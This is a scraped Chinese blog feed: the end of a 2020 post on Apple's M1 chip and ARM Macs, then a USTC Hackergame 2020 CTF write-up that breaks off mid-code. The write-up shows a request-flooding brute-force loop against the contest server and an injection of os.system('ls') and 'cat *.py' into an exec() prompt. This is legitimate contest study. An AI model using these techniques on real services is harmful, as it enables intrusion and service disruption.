href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\">\n<div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-11</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span 